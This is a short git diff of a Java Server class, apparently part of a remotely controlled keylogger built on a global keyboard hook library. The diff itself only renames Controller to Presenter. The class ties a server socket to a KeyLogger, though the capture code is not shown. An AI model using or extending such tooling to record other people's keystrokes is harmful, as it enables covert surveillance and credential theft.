@@ -2,12 +2,11 @@ package model;
 
 import java.io.*;
 import java.net.*;
-import java.util.Scanner;
 
 import com.github.kwhat.jnativehook.NativeHookException;
 import com.github.kwhat.jnativehook.GlobalScreen;
 
-import controller.Controller;
+import presenter.Presenter;
 
 public class Server {
     private enum Status {
@@ -20,12 +19,12 @@ public class Server {
     private InputStream inputStream;
     private OutputStream outputStream;
     private KeyLogger keyLogger;
-    private Controller controller;
+    private Presenter presenter;
     private Status status;
     private boolean isHooked;
 
     public Server(int port, int backlog) {
-        this.controller = controller;
+        this.presenter = presenter;
         createServerSocket(port, backlog);
         keyLogger = new KeyLogger();
 
@@ -82,8 +81,8 @@ public class Server {
 
     }
 
-    public void addController(Controller controller) {
-        this.controller = controller;
+    public void addController(Presenter presenter) {
+        this.presenter = presenter;
     }
 
     private void handleKeyLogging(String action) {
@@ -122,7 +121,7 @@ public class Server {
     }
 
     private void notifyController(String action) {
-        controller.handleAction(action);
+        presenter.handleAction(action);
     }
 
     private void acceptClient() {
